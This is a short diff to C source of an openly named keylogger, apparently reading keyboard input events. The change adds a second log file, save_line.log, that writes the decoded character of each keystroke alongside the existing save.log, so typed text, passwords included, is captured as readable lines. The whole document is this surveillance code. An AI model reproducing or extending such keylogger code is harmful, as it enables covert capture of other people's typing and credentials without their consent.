@@ -30,6 +30,7 @@ void	selectKey(t_keylogger *klg)
 	if (klg->mod.shift)
 		mod += 1;
 	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][mod]);
+	dprintf(klg->saveLineFD, "%s",klg->keymap[klg->event.code -1][mod]);
 	return ;
 }
 void	recording(t_keylogger *klg)
@@ -63,6 +64,11 @@ int main(int ac, char **av)
 		return 0;
 	}
 	if((klg->saveFD = open("save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
+	{
+		dprintf(STDOUT_FILENO, "open save file failed\n");
+		return 0;
+	}
+	if((klg->saveLineFD = open("save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
 	{
 		dprintf(STDOUT_FILENO, "open save file failed\n");
 		return 0;
